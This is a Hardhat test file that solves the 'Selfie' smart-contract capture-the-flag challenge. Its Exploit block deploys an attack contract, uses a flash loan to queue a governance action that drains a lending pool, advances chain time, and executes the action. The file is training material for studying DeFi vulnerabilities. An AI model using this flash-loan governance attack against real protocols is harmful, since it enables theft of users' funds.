const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Selfie', function () {
    let deployer, attacker;

    const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther('2000000'); // 2 million tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1500000'); // 1.5 million tokens
    
    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableTokenSnapshotFactory = await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer);
        const SimpleGovernanceFactory = await ethers.getContractFactory('SimpleGovernance', deployer);
        const SelfiePoolFactory = await ethers.getContractFactory('SelfiePool', deployer);

        this.token = await DamnValuableTokenSnapshotFactory.deploy(TOKEN_INITIAL_SUPPLY);
        this.governance = await SimpleGovernanceFactory.deploy(this.token.address);
        this.pool = await SelfiePoolFactory.deploy(
            this.token.address,
            this.governance.address    
        );

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal(TOKENS_IN_POOL);
    });

    it('Exploit', async function () {

        // Deploy the HackSelfiePool contract
        console.log('Deploying HackSelfiePool contract...');
        const HackSelfiePool = await ethers.getContractFactory('HackSelfiePool', deployer);
        let hack = await HackSelfiePool.deploy(
            this.pool.address,
            this.token.address,
            this.governance.address,
            attacker.address
        );
        await hack.deployed();

        // Check DVT balance
        console.log(`SelfiePool DVT Balance: ${await this.token.balanceOf(this.pool.address)}`);
        console.log(`SimpleGovernance DVT Balance: ${await this.token.balanceOf(this.governance.address)}`);
        console.log(`Attacker DVT Balance: ${await this.token.balanceOf(attacker.address)}`);

        // Take a flashloan that proposes an action that would transfer all DVT to attacker (queueAction)
        console.log('Hacking...');
        await hack.hack();
        console.log('Done hacking...');

        // Increment a block
        console.log('Advance 2 days...');
        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 5 days
        await ethers.provider.send("evm_mine");  // Mine a block

        // Execute the action (executeAction)
        await this.governance.executeAction(1);

        // Check DVT balance
        console.log(`SelfiePool DVT Balance: ${await this.token.balanceOf(this.pool.address)}`);
        console.log(`SimpleGovernance DVT Balance: ${await this.token.balanceOf(this.governance.address)}`);
        console.log(`Attacker DVT Balance: ${await this.token.balanceOf(attacker.address)}`);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.equal(TOKENS_IN_POOL);        
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal('0');
    });
});
